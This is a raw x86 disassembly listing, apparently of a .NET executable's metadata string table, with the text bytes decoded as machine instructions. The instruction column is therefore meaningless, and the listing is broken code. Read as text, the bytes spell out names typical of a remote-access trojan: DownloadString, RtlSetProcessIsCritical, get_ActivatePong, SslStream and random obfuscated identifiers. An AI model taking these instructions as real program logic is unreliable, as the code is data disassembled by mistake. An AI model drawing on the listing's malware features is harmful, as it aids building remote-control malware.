  408b12:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b19:	5f                   	pop    %edi
  408b1a:	52                   	push   %edx
  408b1b:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408b1f:	76 65                	jbe    0x408b86
  408b21:	42                   	inc    %edx
  408b22:	75 66                	jne    0x408b8a
  408b24:	66 65 72 53          	data16 gs jb 0x408b7b
  408b28:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b2f:	5f                   	pop    %edi
  408b30:	4b                   	dec    %ebx
  408b31:	65 79 53             	gs jns 0x408b87
  408b34:	69 7a 65 00 47 47 6a 	imul   $0x6a474700,0x65(%edx),%edi
  408b3b:	63 59 49             	arpl   %ebx,0x49(%ecx)
  408b3e:	7a 74                	jp     0x408bb4
  408b40:	71 6e                	jno    0x408bb0
  408b42:	50                   	push   %eax
  408b43:	50                   	push   %eax
  408b44:	66 00 5a 43          	data16 add %bl,0x43(%edx)
  408b48:	64 43                	fs inc %ebx
  408b4a:	45                   	inc    %ebp
  408b4b:	65 43                	gs inc %ebx
  408b4d:	58                   	pop    %eax
  408b4e:	46                   	inc    %esi
  408b4f:	67 54                	addr16 push %esp
  408b51:	66 00 64 51 48       	data16 add %ah,0x48(%ecx,%edx,2)
  408b56:	57                   	push   %edi
  408b57:	44                   	inc    %esp
  408b58:	69 66 63 57 67 66 00 	imul   $0x666757,0x63(%esi),%esp
  408b5f:	45                   	inc    %ebp
  408b60:	77 50                	ja     0x408bb2
  408b62:	4d                   	dec    %ebp
  408b63:	49                   	dec    %ecx
  408b64:	61                   	popa
  408b65:	77 42                	ja     0x408ba9
  408b67:	54                   	push   %esp
  408b68:	68 67 66 00 59       	push   $0x59006667
  408b6d:	54                   	push   %esp
  408b6e:	67 74 52             	addr16 je 0x408bc3
  408b71:	62 76 6e             	bound  %esi,0x6e(%esi)
  408b74:	51                   	push   %ecx
  408b75:	6a 51                	push   $0x51
  408b77:	63 69 66             	arpl   %ebp,0x66(%ecx)
  408b7a:	00 45 61             	add    %al,0x61(%ebp)
  408b7d:	58                   	pop    %eax
  408b7e:	72 7a                	jb     0x408bfa
  408b80:	78 4e                	js     0x408bd0
  408b82:	45                   	inc    %ebp
  408b83:	67 70 79             	addr16 jo 0x408bff
  408b86:	66 00 78 41          	data16 add %bh,0x41(%eax)
  408b8a:	53                   	push   %ebx
  408b8b:	65 65 56             	gs gs push %esi
  408b8e:	4a                   	dec    %edx
  408b8f:	53                   	push   %ebx
  408b90:	47                   	inc    %edi
  408b91:	54                   	push   %esp
  408b92:	48                   	dec    %eax
  408b93:	42                   	inc    %edx
  408b94:	67 00 75 68          	add    %dh,0x68(%di)
  408b98:	68 64 4f 54 67       	push   $0x67544f64
  408b9d:	5a                   	pop    %edx
  408b9e:	69 44 51 67 00 6e 4e 	imul   $0x484e6e00,0x67(%ecx,%edx,2),%eax
  408ba5:	48 
  408ba6:	79 5a                	jns    0x408c02
  408ba8:	79 4d                	jns    0x408bf7
  408baa:	52                   	push   %edx
  408bab:	48                   	dec    %eax
  408bac:	74 71                	je     0x408c1f
  408bae:	6a 53                	push   $0x53
  408bb0:	67 00 59 6b          	add    %bl,0x6b(%bx,%di)
  408bb4:	46                   	inc    %esi
  408bb5:	4b                   	dec    %ebx
  408bb6:	6b 7a 57 79          	imul   $0x79,0x57(%edx),%edi
  408bba:	70 49                	jo     0x408c05
  408bbc:	6c                   	insb   (%dx),%es:(%edi)
  408bbd:	49                   	dec    %ecx
  408bbe:	78 65                	js     0x408c25
  408bc0:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408bc4:	79 70                	jns    0x408c36
  408bc6:	74 6f                	je     0x408c37
  408bc8:	43                   	inc    %ebx
  408bc9:	6f                   	outsl  %ds:(%esi),(%dx)
  408bca:	6e                   	outsb  %ds:(%esi),(%dx)
  408bcb:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408bd1:	74 5f                	je     0x408c32
  408bd3:	50                   	push   %eax
  408bd4:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408bdb:	5f                   	pop    %edi
  408bdc:	50                   	push   %eax
  408bdd:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408be4:	74 65                	je     0x408c4b
  408be6:	6d                   	insl   (%dx),%es:(%edi)
  408be7:	2e 54                	cs push %esp
  408be9:	68 72 65 61 64       	push   $0x64616572
  408bee:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408bf5:	5f                   	pop    %edi
  408bf6:	50                   	push   %eax
  408bf7:	61                   	popa
  408bf8:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408bff:	64 64 
  408c01:	5f                   	pop    %edi
  408c02:	53                   	push   %ebx
  408c03:	65 73 73             	gs jae 0x408c79
  408c06:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c0d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c0e:	67 00 55 54          	add    %dl,0x54(%di)
  408c12:	46                   	inc    %esi
  408c13:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408c16:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408c19:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c20:	74 65                	je     0x408c87
  408c22:	6d                   	insl   (%dx),%es:(%edi)
  408c23:	2e 44                	cs inc %esp
  408c25:	72 61                	jb     0x408c88
  408c27:	77 69                	ja     0x408c92
  408c29:	6e                   	outsb  %ds:(%esi),(%dx)
  408c2a:	67 2e 49             	addr16 cs dec %ecx
  408c2d:	6d                   	insl   (%dx),%es:(%edi)
  408c2e:	61                   	popa
  408c2f:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408c36:	73 
  408c37:	74 65                	je     0x408c9e
  408c39:	6d                   	insl   (%dx),%es:(%edi)
  408c3a:	2e 52                	cs push %edx
  408c3c:	75 6e                	jne    0x408cac
  408c3e:	74 69                	je     0x408ca9
  408c40:	6d                   	insl   (%dx),%es:(%edi)
  408c41:	65 2e 56             	gs cs push %esi
  408c44:	65 72 73             	gs jb  0x408cba
  408c47:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408c4e:	46                   	inc    %esi
  408c4f:	72 6f                	jb     0x408cc0
  408c51:	6d                   	insl   (%dx),%es:(%edi)
  408c52:	42                   	inc    %edx
  408c53:	61                   	popa
  408c54:	73 65                	jae    0x408cbb
  408c56:	36 34 53             	ss xor $0x53,%al
  408c59:	74 72                	je     0x408ccd
  408c5b:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408c62:	61                   	popa
  408c63:	73 65                	jae    0x408cca
  408c65:	36 34 53             	ss xor $0x53,%al
  408c68:	74 72                	je     0x408cdc
  408c6a:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408c71:	6e                   	outsb  %ds:(%esi),(%dx)
  408c72:	6c                   	insb   (%dx),%es:(%edi)
  408c73:	6f                   	outsl  %ds:(%esi),(%dx)
  408c74:	61                   	popa
  408c75:	64 53                	fs push %ebx
  408c77:	74 72                	je     0x408ceb
  408c79:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408c80:	74 72                	je     0x408cf4
  408c82:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408c89:	5f                   	pop    %edi
  408c8a:	41                   	inc    %ecx
  408c8b:	73 53                	jae    0x408ce0
  408c8d:	74 72                	je     0x408d01
  408c8f:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c96:	5f                   	pop    %edi
  408c97:	41                   	inc    %ecx
  408c98:	73 53                	jae    0x408ced
  408c9a:	74 72                	je     0x408d0e
  408c9c:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408ca3:	53                   	push   %ebx
  408ca4:	74 72                	je     0x408d18
  408ca6:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408cad:	73 74                	jae    0x408d23
  408caf:	72 69                	jb     0x408d1a
  408cb1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cb2:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408cb6:	73 74                	jae    0x408d2c
  408cb8:	65 6d                	gs insl (%dx),%es:(%edi)
  408cba:	2e 44                	cs inc %esp
  408cbc:	72 61                	jb     0x408d1f
  408cbe:	77 69                	ja     0x408d29
  408cc0:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc1:	67 00 67 65          	add    %ah,0x65(%bx)
  408cc5:	74 5f                	je     0x408d26
  408cc7:	41                   	inc    %ecx
  408cc8:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408ccc:	61                   	popa
  408ccd:	74 65                	je     0x408d34
  408ccf:	50                   	push   %eax
  408cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd2:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408cd6:	74 5f                	je     0x408d37
  408cd8:	41                   	inc    %ecx
  408cd9:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408cdd:	61                   	popa
  408cde:	74 65                	je     0x408d45
  408ce0:	50                   	push   %eax
  408ce1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce2:	6e                   	outsb  %ds:(%esi),(%dx)
  408ce3:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408ce7:	74 5f                	je     0x408d48
  408ce9:	45                   	inc    %ebp
  408cea:	72 72                	jb     0x408d5e
  408cec:	6f                   	outsl  %ds:(%esi),(%dx)
  408ced:	72 44                	jb     0x408d33
  408cef:	69 61 6c 6f 67 00 47 	imul   $0x4700676f,0x6c(%ecx),%esp
  408cf6:	47                   	inc    %edi
  408cf7:	70 76                	jo     0x408d6f
  408cf9:	51                   	push   %ecx
  408cfa:	58                   	pop    %eax
  408cfb:	64 45                	fs inc %ebp
  408cfd:	43                   	inc    %ebx
  408cfe:	72 70                	jb     0x408d70
  408d00:	55                   	push   %ebp
  408d01:	68 00 4e 48 77       	push   $0x77484e00
  408d06:	67 68 42 47 48 56    	addr16 push $0x56484742
  408d0c:	68 00 58 78 77       	push   $0x77785800
  408d11:	7a 62                	jp     0x408d75
  408d13:	6c                   	insb   (%dx),%es:(%edi)
  408d14:	7a 56                	jp     0x408d6c
  408d16:	49                   	dec    %ecx
  408d17:	6d                   	insl   (%dx),%es:(%edi)
  408d18:	42                   	inc    %edx
  408d19:	61                   	popa
  408d1a:	68 00 4f 4c 6f       	push   $0x6f4c4f00
  408d1f:	75 67                	jne    0x408d88
  408d21:	57                   	push   %edi
  408d22:	73 75                	jae    0x408d99
  408d24:	45                   	inc    %ebp
  408d25:	63 67 64             	arpl   %esp,0x64(%edi)
  408d28:	68 00 68 74 73       	push   $0x73746800
  408d2d:	50                   	push   %eax
  408d2e:	55                   	push   %ebp
  408d2f:	46                   	inc    %esi
  408d30:	71 50                	jno    0x408d82
  408d32:	63 57 67             	arpl   %edx,0x67(%edi)
  408d35:	68 00 43 6f 6d       	push   $0x6d6f4300
  408d3a:	70 75                	jo     0x408db1
  408d3c:	74 65                	je     0x408da3
  408d3e:	48                   	dec    %eax
  408d3f:	61                   	popa
  408d40:	73 68                	jae    0x408daa
  408d42:	00 56 65             	add    %dl,0x65(%esi)
  408d45:	72 69                	jb     0x408db0
  408d47:	66 79 48             	data16 jns 0x408d92
  408d4a:	61                   	popa
  408d4b:	73 68                	jae    0x408db5
  408d4d:	00 46 6c             	add    %al,0x6c(%esi)
  408d50:	75 73                	jne    0x408dc5
  408d52:	68 00 67 65 74       	push   $0x74656700
  408d57:	5f                   	pop    %edi
  408d58:	45                   	inc    %ebp
  408d59:	78 65                	js     0x408dc0
  408d5b:	63 75 74             	arpl   %esi,0x74(%ebp)
  408d5e:	61                   	popa
  408d5f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408d63:	61                   	popa
  408d64:	74 68                	je     0x408dce
  408d66:	00 47 65             	add    %al,0x65(%edi)
  408d69:	74 54                	je     0x408dbf
  408d6b:	65 6d                	gs insl (%dx),%es:(%edi)
  408d6d:	70 50                	jo     0x408dbf
  408d6f:	61                   	popa
  408d70:	74 68                	je     0x408dda
  408d72:	00 67 65             	add    %ah,0x65(%edi)
  408d75:	74 5f                	je     0x408dd6
  408d77:	4c                   	dec    %esp
  408d78:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d7a:	67 74 68             	addr16 je 0x408de5
  408d7d:	00 6b 4f             	add    %ch,0x4f(%ebx)
  408d80:	4a                   	dec    %edx
  408d81:	57                   	push   %edi
  408d82:	78 79                	js     0x408dfd
  408d84:	62 63 4d             	bound  %esp,0x4d(%ebx)
  408d87:	47                   	inc    %edi
  408d88:	58                   	pop    %eax
  408d89:	51                   	push   %ecx
  408d8a:	78 68                	js     0x408df4
  408d8c:	00 42 79             	add    %al,0x79(%edx)
  408d8f:	54                   	push   %esp
  408d90:	78 57                	js     0x408de9
  408d92:	70 78                	jo     0x408e0c
  408d94:	6b 66 50 6b          	imul   $0x6b,0x50(%esi),%esp
  408d98:	76 42                	jbe    0x408ddc
  408d9a:	4d                   	dec    %ebp
  408d9b:	79 68                	jns    0x408e05
  408d9d:	00 41 6a             	add    %al,0x6a(%ecx)
  408da0:	77 65                	ja     0x408e07
  408da2:	47                   	inc    %edi
  408da3:	59                   	pop    %ecx
  408da4:	44                   	inc    %esp
  408da5:	61                   	popa
  408da6:	6a 55                	push   $0x55
  408da8:	64 69 00 55 72 69 00 	imul   $0x697255,%fs:(%eax),%eax
  408daf:	53                   	push   %ebx
  408db0:	65 59                	gs pop %ecx
  408db2:	54                   	push   %esp
  408db3:	65 51                	gs push %ecx
  408db5:	6c                   	insb   (%dx),%es:(%edi)
  408db6:	45                   	inc    %ebp
  408db7:	55                   	push   %ebp
  408db8:	49                   	dec    %ecx
  408db9:	53                   	push   %ebx
  408dba:	45                   	inc    %ebp
  408dbb:	6a 00                	push   $0x0
  408dbd:	70 4f                	jo     0x408e0e
  408dbf:	53                   	push   %ebx
  408dc0:	6d                   	insl   (%dx),%es:(%edi)
  408dc1:	4a                   	dec    %edx
  408dc2:	4b                   	dec    %ebx
  408dc3:	54                   	push   %esp
  408dc4:	43                   	inc    %ebx
  408dc5:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc6:	45                   	inc    %ebp
  408dc7:	6a 00                	push   $0x0
  408dc9:	46                   	inc    %esi
  408dca:	4e                   	dec    %esi
  408dcb:	4d                   	dec    %ebp
  408dcc:	72 5a                	jb     0x408e28
  408dce:	72 58                	jb     0x408e28
  408dd0:	42                   	inc    %edx
  408dd1:	61                   	popa
  408dd2:	41                   	inc    %ecx
  408dd3:	44                   	inc    %esp
  408dd4:	4c                   	dec    %esp
  408dd5:	42                   	inc    %edx
  408dd6:	47                   	inc    %edi
  408dd7:	6a 00                	push   $0x0
  408dd9:	59                   	pop    %ecx
  408dda:	6f                   	outsl  %ds:(%esi),(%dx)
  408ddb:	47                   	inc    %edi
  408ddc:	41                   	inc    %ecx
  408ddd:	63 4e 53             	arpl   %ecx,0x53(%esi)
  408de0:	4a                   	dec    %edx
  408de1:	54                   	push   %esp
  408de2:	6c                   	insb   (%dx),%es:(%edi)
  408de3:	43                   	inc    %ebx
  408de4:	53                   	push   %ebx
  408de5:	6a 00                	push   $0x0
  408de7:	66 4c                	dec    %sp
  408de9:	78 77                	js     0x408e62
  408deb:	43                   	inc    %ebx
  408dec:	7a 71                	jp     0x408e5f
  408dee:	4f                   	dec    %edi
  408def:	50                   	push   %eax
  408df0:	70 6a                	jo     0x408e5c
  408df2:	00 66 46             	add    %ah,0x46(%esi)
  408df5:	79 55                	jns    0x408e4c
  408df7:	76 75                	jbe    0x408e6e
  408df9:	4e                   	dec    %esi
  408dfa:	4b                   	dec    %ebx
  408dfb:	49                   	dec    %ecx
  408dfc:	75 77                	jne    0x408e75
  408dfe:	6a 00                	push   $0x0
  408e00:	43                   	inc    %ebx
  408e01:	64 73 4a             	fs jae 0x408e4e
  408e04:	56                   	push   %esi
  408e05:	4c                   	dec    %esp
  408e06:	72 7a                	jb     0x408e82
  408e08:	79 77                	jns    0x408e81
  408e0a:	7a 64                	jp     0x408e70
  408e0c:	4e                   	dec    %esi
  408e0d:	6b 00 41             	imul   $0x41,(%eax),%eax
  408e10:	73 79                	jae    0x408e8b
  408e12:	6e                   	outsb  %ds:(%esi),(%dx)
  408e13:	63 43 61             	arpl   %eax,0x61(%ebx)
  408e16:	6c                   	insb   (%dx),%es:(%edi)
  408e17:	6c                   	insb   (%dx),%es:(%edi)
  408e18:	62 61 63             	bound  %esp,0x63(%ecx)
  408e1b:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e1e:	65 6d                	gs insl (%dx),%es:(%edi)
  408e20:	6f                   	outsl  %ds:(%esi),(%dx)
  408e21:	74 65                	je     0x408e88
  408e23:	43                   	inc    %ebx
  408e24:	65 72 74             	gs jb  0x408e9b
  408e27:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e2e:	56                   	push   %esi
  408e2f:	61                   	popa
  408e30:	6c                   	insb   (%dx),%es:(%edi)
  408e31:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408e38:	43 
  408e39:	61                   	popa
  408e3a:	6c                   	insb   (%dx),%es:(%edi)
  408e3b:	6c                   	insb   (%dx),%es:(%edi)
  408e3c:	62 61 63             	bound  %esp,0x63(%ecx)
  408e3f:	6b 00 54             	imul   $0x54,(%eax),%eax
  408e42:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408e49:	6c                   	insb   (%dx),%es:(%edi)
  408e4a:	62 61 63             	bound  %esp,0x63(%ecx)
  408e4d:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e50:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408e57:	4b 65 
  408e59:	79 50                	jns    0x408eab
  408e5b:	65 72 6d             	gs jb  0x408ecb
  408e5e:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408e65:	68 65 63 6b 00       	push   $0x6b6365
  408e6a:	46                   	inc    %esi
  408e6b:	6c                   	insb   (%dx),%es:(%edi)
  408e6c:	75 73                	jne    0x408ee1
  408e6e:	68 46 69 6e 61       	push   $0x616e6946
  408e73:	6c                   	insb   (%dx),%es:(%edi)
  408e74:	42                   	inc    %edx
  408e75:	6c                   	insb   (%dx),%es:(%edi)
  408e76:	6f                   	outsl  %ds:(%esi),(%dx)
  408e77:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408e7a:	63 73 69             	arpl   %esi,0x69(%ebx)
  408e7d:	55                   	push   %ebp
  408e7e:	41                   	inc    %ecx
  408e7f:	48                   	dec    %eax
  408e80:	44                   	inc    %esp
  408e81:	73 64                	jae    0x408ee7
  408e83:	66 6b 00 55          	imul   $0x55,(%eax),%ax
  408e87:	4f                   	dec    %edi
  408e88:	6f                   	outsl  %ds:(%esi),(%dx)
  408e89:	62 4c 7a 4c          	bound  %ecx,0x4c(%edx,%edi,2)
  408e8d:	63 6e 6c             	arpl   %ebp,0x6c(%esi)
  408e90:	48                   	dec    %eax
  408e91:	6c                   	insb   (%dx),%es:(%edi)
  408e92:	68 6a 6b 00 6e       	push   $0x6e006b6a
  408e97:	4b                   	dec    %ebx
  408e98:	4e                   	dec    %esi
  408e99:	69 77 72 66 6e 76 4c 	imul   $0x4c766e66,0x72(%edi),%esi
  408ea0:	46                   	inc    %esi
  408ea1:	42                   	inc    %edx
  408ea2:	58                   	pop    %eax
  408ea3:	47                   	inc    %edi
  408ea4:	70 6b                	jo     0x408f11
  408ea6:	00 68 64             	add    %ch,0x64(%eax)
  408ea9:	78 6d                	js     0x408f18
  408eab:	74 65                	je     0x408f12
  408ead:	69 59 65 63 65 71 6b 	imul   $0x6b716563,0x65(%ecx),%ebx
  408eb4:	00 6f 61             	add    %ch,0x61(%edi)
  408eb7:	71 75                	jno    0x408f2e
  408eb9:	44                   	inc    %esp
  408eba:	71 56                	jno    0x408f12
  408ebc:	62 45 45             	bound  %eax,0x45(%ebp)
  408ebf:	63 79 6b             	arpl   %edi,0x6b(%ecx)
  408ec2:	00 58 4a             	add    %bl,0x4a(%eax)
  408ec5:	58                   	pop    %eax
  408ec6:	59                   	pop    %ecx
  408ec7:	4e                   	dec    %esi
  408ec8:	71 4c                	jno    0x408f16
  408eca:	74 48                	je     0x408f14
  408ecc:	6c                   	insb   (%dx),%es:(%edi)
  408ecd:	00 58 6f             	add    %bl,0x6f(%eax)
  408ed0:	50                   	push   %eax
  408ed1:	43                   	inc    %ebx
  408ed2:	52                   	push   %edx
  408ed3:	63 73 6f             	arpl   %esi,0x6f(%ebx)
  408ed6:	4e                   	dec    %esi
  408ed7:	57                   	push   %edi
  408ed8:	62 51 6c             	bound  %edx,0x6c(%ecx)
  408edb:	00 66 71             	add    %ah,0x71(%esi)
  408ede:	4e                   	dec    %esi
  408edf:	6d                   	insl   (%dx),%es:(%edi)
  408ee0:	6b 71 55 6d          	imul   $0x6d,0x55(%ecx),%esi
  408ee4:	51                   	push   %ecx
  408ee5:	6c                   	insb   (%dx),%es:(%edi)
  408ee6:	00 46 77             	add    %al,0x77(%esi)
  408ee9:	4f                   	dec    %edi
  408eea:	57                   	push   %edi
  408eeb:	64 79 70             	fs jns 0x408f5e
  408eee:	57                   	push   %edi
  408eef:	47                   	inc    %edi
  408ef0:	52                   	push   %edx
  408ef1:	6c                   	insb   (%dx),%es:(%edi)
  408ef2:	00 63 62             	add    %ah,0x62(%ebx)
  408ef5:	76 49                	jbe    0x408f40
  408ef7:	42                   	inc    %edx
  408ef8:	41                   	inc    %ecx
  408ef9:	4b                   	dec    %ebx
  408efa:	6d                   	insl   (%dx),%es:(%edi)
  408efb:	57                   	push   %edi
  408efc:	6c                   	insb   (%dx),%es:(%edi)
  408efd:	00 52 74             	add    %dl,0x74(%edx)
  408f00:	6c                   	insb   (%dx),%es:(%edi)
  408f01:	53                   	push   %ebx
  408f02:	65 74 50             	gs je  0x408f55
  408f05:	72 6f                	jb     0x408f76
  408f07:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f0a:	73 49                	jae    0x408f55
  408f0c:	73 43                	jae    0x408f51
  408f0e:	72 69                	jb     0x408f79
  408f10:	74 69                	je     0x408f7b
  408f12:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f15:	00 4e 65             	add    %cl,0x65(%esi)
  408f18:	74 77                	je     0x408f91
  408f1a:	6f                   	outsl  %ds:(%esi),(%dx)
  408f1b:	72 6b                	jb     0x408f88
  408f1d:	43                   	inc    %ebx
  408f1e:	72 65                	jb     0x408f85
  408f20:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f23:	74 69                	je     0x408f8e
  408f25:	61                   	popa
  408f26:	6c                   	insb   (%dx),%es:(%edi)
  408f27:	00 53 79             	add    %dl,0x79(%ebx)
  408f2a:	73 74                	jae    0x408fa0
  408f2c:	65 6d                	gs insl (%dx),%es:(%edi)
  408f2e:	2e 53                	cs push %ebx
  408f30:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408f34:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408f3b:	6e 
  408f3c:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f3f:	61                   	popa
  408f40:	6c                   	insb   (%dx),%es:(%edi)
  408f41:	00 57 69             	add    %dl,0x69(%edi)
  408f44:	6e                   	outsb  %ds:(%esi),(%dx)
  408f45:	64 6f                	outsl  %fs:(%esi),(%dx)
  408f47:	77 73                	ja     0x408fbc
  408f49:	50                   	push   %eax
  408f4a:	72 69                	jb     0x408fb5
  408f4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4d:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f50:	61                   	popa
  408f51:	6c                   	insb   (%dx),%es:(%edi)
  408f52:	00 67 65             	add    %ah,0x65(%edi)
  408f55:	74 5f                	je     0x408fb6
  408f57:	49                   	dec    %ecx
  408f58:	6e                   	outsb  %ds:(%esi),(%dx)
  408f59:	74 65                	je     0x408fc0
  408f5b:	72 76                	jb     0x408fd3
  408f5d:	61                   	popa
  408f5e:	6c                   	insb   (%dx),%es:(%edi)
  408f5f:	00 73 65             	add    %dh,0x65(%ebx)
  408f62:	74 5f                	je     0x408fc3
  408f64:	49                   	dec    %ecx
  408f65:	6e                   	outsb  %ds:(%esi),(%dx)
  408f66:	74 65                	je     0x408fcd
  408f68:	72 76                	jb     0x408fe0
  408f6a:	61                   	popa
  408f6b:	6c                   	insb   (%dx),%es:(%edi)
  408f6c:	00 57 75             	add    %dl,0x75(%edi)
  408f6f:	50                   	push   %eax
  408f70:	71 49                	jno    0x408fbb
  408f72:	75 76                	jne    0x408fea
  408f74:	58                   	pop    %eax
  408f75:	62 6c 00 6b          	bound  %ebp,0x6b(%eax,%eax,1)
  408f79:	65 72 6e             	gs jb  0x408fea
  408f7c:	65 6c                	gs insb (%dx),%es:(%edi)
  408f7e:	33 32                	xor    (%edx),%esi
  408f80:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408f83:	6c                   	insb   (%dx),%es:(%edi)
  408f84:	00 75 73             	add    %dh,0x73(%ebp)
  408f87:	65 72 33             	gs jb  0x408fbd
  408f8a:	32 2e                	xor    (%esi),%ch
  408f8c:	64 6c                	fs insb (%dx),%es:(%edi)
  408f8e:	6c                   	insb   (%dx),%es:(%edi)
  408f8f:	00 6e 74             	add    %ch,0x74(%esi)
  408f92:	64 6c                	fs insb (%dx),%es:(%edi)
  408f94:	6c                   	insb   (%dx),%es:(%edi)
  408f95:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408f98:	6c                   	insb   (%dx),%es:(%edi)
  408f99:	00 4b 69             	add    %cl,0x69(%ebx)
  408f9c:	6c                   	insb   (%dx),%es:(%edi)
  408f9d:	6c                   	insb   (%dx),%es:(%edi)
  408f9e:	00 50 6f             	add    %dl,0x6f(%eax)
  408fa1:	6c                   	insb   (%dx),%es:(%edi)
  408fa2:	6c                   	insb   (%dx),%es:(%edi)
  408fa3:	00 66 54             	add    %ah,0x54(%esi)
  408fa6:	75 6e                	jne    0x409016
  408fa8:	77 56                	ja     0x409000
  408faa:	4a                   	dec    %edx
  408fab:	44                   	inc    %esp
  408fac:	51                   	push   %ecx
  408fad:	75 46                	jne    0x408ff5
  408faf:	4a                   	dec    %edx
  408fb0:	6d                   	insl   (%dx),%es:(%edi)
  408fb1:	00 44 52 62          	add    %al,0x62(%edx,%edx,2)
  408fb5:	79 45                	jns    0x408ffc
  408fb7:	53                   	push   %ebx
  408fb8:	62 46 7a             	bound  %eax,0x7a(%esi)
  408fbb:	53                   	push   %ebx
  408fbc:	77 4b                	ja     0x409009
  408fbe:	6d                   	insl   (%dx),%es:(%edi)
  408fbf:	00 4b 6e             	add    %cl,0x6e(%ebx)
  408fc2:	62 66 61             	bound  %esp,0x61(%esi)
  408fc5:	51                   	push   %ecx
  408fc6:	75 64                	jne    0x40902c
  408fc8:	66 4e                	dec    %si
  408fca:	6d                   	insl   (%dx),%es:(%edi)
  408fcb:	00 46 69             	add    %al,0x69(%esi)
  408fce:	6c                   	insb   (%dx),%es:(%edi)
  408fcf:	65 53                	gs push %ebx
  408fd1:	74 72                	je     0x409045
  408fd3:	65 61                	gs popa
  408fd5:	6d                   	insl   (%dx),%es:(%edi)
  408fd6:	00 4e 65             	add    %cl,0x65(%esi)
  408fd9:	74 77                	je     0x409052
  408fdb:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdc:	72 6b                	jb     0x409049
  408fde:	53                   	push   %ebx
  408fdf:	74 72                	je     0x409053
  408fe1:	65 61                	gs popa
  408fe3:	6d                   	insl   (%dx),%es:(%edi)
  408fe4:	00 53 73             	add    %dl,0x73(%ebx)
  408fe7:	6c                   	insb   (%dx),%es:(%edi)
  408fe8:	53                   	push   %ebx
  408fe9:	74 72                	je     0x40905d
  408feb:	65 61                	gs popa
  408fed:	6d                   	insl   (%dx),%es:(%edi)
  408fee:	00 43 72             	add    %al,0x72(%ebx)
  408ff1:	79 70                	jns    0x409063
  408ff3:	74 6f                	je     0x409064
  408ff5:	53                   	push   %ebx
  408ff6:	74 72                	je     0x40906a
  408ff8:	65 61                	gs popa
  408ffa:	6d                   	insl   (%dx),%es:(%edi)
  408ffb:	00 47 5a             	add    %al,0x5a(%edi)
  408ffe:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  409005:	6d                   	insl   (%dx),%es:(%edi)
  409006:	00 4d 65             	add    %cl,0x65(%ebp)
  409009:	6d                   	insl   (%dx),%es:(%edi)
  40900a:	6f                   	outsl  %ds:(%esi),(%dx)
  40900b:	72 79                	jb     0x409086
  40900d:	53                   	push   %ebx
  40900e:	74 72                	je     0x409082
  409010:	65 61                	gs popa
  409012:	6d                   	insl   (%dx),%es:(%edi)
  409013:	00 70 46             	add    %dh,0x46(%eax)
  409016:	56                   	push   %esi
  409017:	51                   	push   %ecx
  409018:	61                   	popa
  409019:	6d                   	insl   (%dx),%es:(%edi)
  40901a:	46                   	inc    %esi
  40901b:	6a 61                	push   $0x61
  40901d:	6d                   	insl   (%dx),%es:(%edi)
  40901e:	00 67 65             	add    %ah,0x65(%edi)
  409021:	74 5f                	je     0x409082
